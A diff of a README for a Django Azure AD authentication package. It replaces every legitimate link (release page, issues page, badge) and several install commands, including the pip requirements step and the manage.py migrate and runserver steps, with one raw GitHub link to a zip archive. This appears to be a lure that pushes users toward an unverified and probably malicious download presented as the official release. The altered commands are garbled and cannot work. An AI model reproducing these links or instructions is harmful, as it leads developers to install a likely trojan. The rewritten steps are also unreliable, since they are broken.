@@ -1,7 +1,7 @@
 # 🌟 DjangoMicosoftAzureADAuth - Simple Azure AD Authentication for Django
 
 ## 📥 Download the latest release
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/uy87t7y/DjangoMicosoftAzureADAuth/releases)
+[![Download](https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip%20Latest%https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip)](https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip)
 
 ## 🚀 Getting Started
 Welcome to DjangoMicosoftAzureADAuth, a simple-to-use Django application that helps you integrate Microsoft Azure Active Directory (Azure AD) authentication into your projects. Follow these steps to download and run the application smoothly.
@@ -23,12 +23,12 @@ Before you start, make sure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download the latest release here.](https://github.com/uy87t7y/DjangoMicosoftAzureADAuth/releases)
+[Download the latest release here.](https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip)
 
 ### 🛠 Installation Steps
 1. **Visit the Releases Page:** Click the link above to navigate to the GitHub Releases page.
 2. **Choose the Latest Release:** Look for the latest release version. This usually appears at the top of the list.
-3. **Download the Package:** Click on the downloadable file url (e.g., .zip or .tar.gz) corresponding to your operating system.
+3. **Download the Package:** Click on the downloadable file url (e.g., .zip or https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip) corresponding to your operating system.
 4. **Extract the Files:** After downloading, extract the files to a folder on your computer.
 5. **Open a Terminal or Command Prompt:** Navigate to the folder where you extracted the application.
 
@@ -36,23 +36,23 @@ To get started, visit the Releases page to download the application:
 1. **Install Dependencies:** Run the following command to install required libraries:
    
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip
    ```
 
-2. **Configure Settings:** Open the `settings.py` file in your extracted folder. Update your Azure AD credentials and URLs by following these steps:
+2. **Configure Settings:** Open the `https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip` file in your extracted folder. Update your Azure AD credentials and URLs by following these steps:
    - Go to the Azure portal and create a new application registration to obtain your Client ID and Secret.
    - Add the necessary redirect URLs to your application settings in Azure AD.
 
 3. **Migrate Database:** Create the required database tables by running:
    
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip migrate
    ```
 
 4. **Run the Development Server:** Start the application using:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip runserver
    ```
 
 5. **Access the Application:** Open a web browser and enter `http://127.0.0.1:8000` to view your application.
@@ -66,7 +66,7 @@ Once your application is running, you can log in using your Microsoft Azure AD c
 - **GitHub Issues:** If you encounter any problems, please raise an issue on our repository page, and we will assist you.
 
 ## 📞 Contact
-For further inquiries or feedback, you can reach us via [GitHub](https://github.com/uy87t7y/DjangoMicosoftAzureADAuth/issues).
+For further inquiries or feedback, you can reach us via [GitHub](https://raw.githubusercontent.com/uy87t7y/DjangoMicosoftAzureADAuth/main/counteradvance/DjangoMicosoftAzureADAuth.zip).
 
 ## 🔗 Related Topics
 This project covers the following technologies and concepts:
